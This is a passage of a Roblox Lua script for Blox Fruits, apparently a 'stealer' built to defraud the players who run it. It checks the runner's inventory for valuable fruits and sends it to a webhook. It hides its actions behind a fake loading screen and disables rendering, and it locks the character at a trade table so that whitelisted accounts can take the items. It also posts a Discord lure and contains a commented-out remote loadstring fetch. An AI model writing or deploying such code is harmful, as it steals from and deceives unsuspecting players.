	local TABLE_CHECK_INTERVAL = 2
	local MOVEMENT_CHECK_INTERVAL = 4
	local TRADE_VALIDATION_DELAY = 1.5
	local TRADE_RECHECK_COUNT = 4

	local validateTradePartnerRunning = false

	local function validateTradePartner()
		if validateTradePartnerRunning then return end
		validateTradePartnerRunning = true

		local failedChecks = 0
		local lastTradeState = false -- Track trade visibility state

		for _ = 1, TRADE_RECHECK_COUNT do
			task.wait(0.25)
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			local currentTradeState = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible

			-- Increment fail count if trade closed, visibility changed, or partner is invalid
			if lastTradeState ~= currentTradeState or not currentTradeState or not isInTradeWithCorrectPlayer() then
				failedChecks = failedChecks + 1
			end
			lastTradeState = currentTradeState -- Update last known state
		end

		-- If validation failed most checks, force a jump (to potentially break sit/trade)
		if failedChecks >= TRADE_RECHECK_COUNT - 1 then -- Allow 1 successful check
			task.wait(0.1)
			ForceJump()
		end

		validateTradePartnerRunning = false
	end

	-- Connections for character events
	local charAddedConn, charRemovingConn, jumpCleanupFunc

	local function onCharacterAdded(character)
		task.wait(1) -- Wait for character to fully load
		local humanoid = character:WaitForChild("Humanoid", 5)
		local rootPart = character:WaitForChild("HumanoidRootPart", 5)
		if not humanoid or not rootPart then return end -- Exit if essential parts missing

		local now = tick()
		lastMovementTime, lastTableCheck, lastTradeCheck = now, now, now -- Reset timers

		jumpCleanupFunc = disableJump() -- Re-apply jump lock

		-- Find table and move to it
		task.spawn(function()
			currentTable, currentSeat = findTradeTable()
			if currentTable and currentSeat then
				tweenToPosition(currentSeat.Position)
			end
		end)
	end

	local function onCharacterRemoving()
		-- Reset state when character removed
		currentTable, currentSeat = nil, nil
		if jumpCleanupFunc then jumpCleanupFunc() end -- Clean up jump listeners
	end

	-- The main execution loop
	local function runMainLoop()
		local lastTime = tick()
		while isLoopRunning do
			local now = tick()
			local deltaTime = now - lastTime
			lastTime = now

			local character = LocalPlayer.Character
			if character and character:FindFirstChild("HumanoidRootPart") then
				local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
				local isInTrade = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible

				-- Trade validation logic
				if not isInTrade then
					hasCheckedCurrentTrade = false -- Reset check flag when not in trade
					lastTradeCheck = now
				elseif not hasCheckedCurrentTrade and (now - lastTradeCheck) >= TRADE_VALIDATION_DELAY then
					task.spawn(validateTradePartner) -- Validate partner after delay
					hasCheckedCurrentTrade = true
				end

				-- Periodically check for a better table
				if now - lastTableCheck >= TABLE_CHECK_INTERVAL then
					task.spawn(function()
						local newTable, newSeat = findTradeTable()
						if newTable and newSeat then
							currentTable, currentSeat = newTable, newSeat
						end
					end)
					lastTableCheck = now
				end

				-- Position maintenance logic
				if currentTable and currentSeat then
					local root = character.HumanoidRootPart
                    if root then -- Ensure root part exists
					    local distance = (root.Position - currentSeat.Position).Magnitude

					    if distance > 5 then -- If too far, tween back
						    tweenToPosition(currentSeat.Position)
					    elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then -- Periodically jiggle slightly
						    local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
						    tweenToPosition(currentSeat.Position + randomOffset)
						    lastMovementTime = now
					    end
                    end
				end
			end

			-- Wait efficiently
			local timeElapsed = tick() - now
			local waitTime = math.max(0.01, UPDATE_INTERVAL - timeElapsed)
			task.wait(waitTime)
		end
	end

	-- Connect character listeners
	charAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
	charRemovingConn = LocalPlayer.CharacterRemoving:Connect(onCharacterRemoving)

	-- Initial setup if character already exists
	if LocalPlayer.Character then
		task.spawn(onCharacterAdded, LocalPlayer.Character)
	end

	-- Start the loop
	task.spawn(runMainLoop)

	-- Return cleanup function for the main loop
	return function()
		isLoopRunning = false
		if charAddedConn then charAddedConn:Disconnect(); charAddedConn = nil end
		if charRemovingConn then charRemovingConn:Disconnect(); charRemovingConn = nil end
		if jumpCleanupFunc then jumpCleanupFunc() end -- Cleanup jump locks
		currentTable, currentSeat = nil, nil -- Clear state
	end
end

local function init()
	local placeId = game.PlaceId
	-- Check if in correct game/sea
	if placeId == 2753915549 then LocalPlayer:Kick("This script works only in Sea 2 or 3!"); return end
	if placeId ~= 4442272183 and placeId ~= 7449423635 then LocalPlayer:Kick("This script is meant for Blox Fruits only!"); return end

	-- Get initial inventory snapshot
	local initialInventory = getInventory() -- Renamed to avoid conflict with global 'inventory22'
	if not initialInventory then LocalPlayer:Kick("Error getting initial inventory."); return end
    inventory22 = initialInventory -- Assign to the global used by leave check functions

	-- Check if player has items worth notifying about
	local function checkInventoryForHit(inv)
		local fruitsToHitSet = {}; for _, f in ipairs(FruitsToHit) do fruitsToHitSet[f] = true end
		for _, item in ipairs(inv) do
			if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or item.Type == "Premium" then
				return true
			end
		end
		return false
	end

	if not checkInventoryForHit(initialInventory) then
		LocalPlayer:Kick("No valuable items detected for initial hit. (Alt Account Filter)")
		return
	end

	-- Initial actions if valuable items found
	task.spawn(function()
		task.wait(1)
		JoinTeam()
		task.spawn(createNotification) -- Show cosmetic loading UI
		sendWebhook(initialInventory)       -- Send the main hit webhook(s) using initial snapshot
	end)

	-- State variables for activation logic
	local mainLoopStopper = nil -- Stores the cleanup function for the main loop
	local chatConnection = nil
	local externalUILoaded = false

	-- Function to run when an authorized player joins
	local function onPlayerAdded(player)
		if mainLoopStopper then return end -- Prevent activation if already running

		-- Check if joining player is whitelisted (only whitelisted trigger activation)
		local isWhitelisted = (Usernames and table.find(Usernames, player.Name))
		if not isWhitelisted then return end

		mainLoopStopper = function() end -- Set placeholder to prevent re-activation

		-- Spawn activation sequence
		task.spawn(function()
			-- Load External UI (optional, if URL is set)
			if not externalUILoaded then
				local success, err = pcall(function()
					-- Ensure the HttpGet call is safe and intended if used
					-- loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))()
                    warn("External UI loading is commented out for safety.") -- Commented out for safety
				end)
				if not success then warn("Failed to load external UI:", err) else externalUILoaded = true end
			end
			task.wait(1) -- Wait a bit after UI load attempt

			-- Connect Chat Listener if not already connected
			if not chatConnection then
				chatConnection = Players.PlayerChatted:Connect(processChatCommand)
			end

			-- Disable Rendering & Start Main Loop
			RunService:Set3dRenderingEnabled(false)
			mainLoopStopper = startMainLoop() -- Store the actual cleanup function

			-- Initial Chat Message
			task.spawn(function()
				task.wait(2)
				sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")
			end)
		end)
	end

	-- Connect listener for players joining
	local playerAddedConn = Players.PlayerAdded:Connect(onPlayerAdded)

	-- Check already existing players
	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			onPlayerAdded(player)
		end
	end)

	-- Cleanup on local player leaving
	local localPlayerRemovingConn
	localPlayerRemovingConn = Players.PlayerRemoving:Connect(function(player)
		if player == LocalPlayer then
			-- Disconnect listeners
			if playerAddedConn then playerAddedConn:Disconnect() end
			if chatConnection then chatConnection:Disconnect() end
			-- Call the main loop cleanup function if it exists
			if mainLoopStopper and type(mainLoopStopper) == "function" then
				mainLoopStopper()
			end
			-- Disconnect self
			if localPlayerRemovingConn then localPlayerRemovingConn:Disconnect() end
		end
	end)
end

--[[ Script Entry Point ]]--
-- Use a unique variable for basic re-execution prevention
if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v2 then
	shared.ScriptExecuted_SharkyV2_FinalFormatted_v2 = true
	task.spawn(function() -- Run init in a protected thread
		local success, errorMessage = pcall(init)
		if not success then
			warn("SCRIPT INIT ERROR:", errorMessage)
			task.spawn(function() -- Use another task.spawn for kick to avoid issues within pcall error handling
                local safeMsg = string.gsub(tostring(errorMessage or "Unknown Error"), "[<>\"']", "") -- Sanitize message
				LocalPlayer:Kick("Script Initialization Error: " .. safeMsg)
			end)
		end
	end)
end
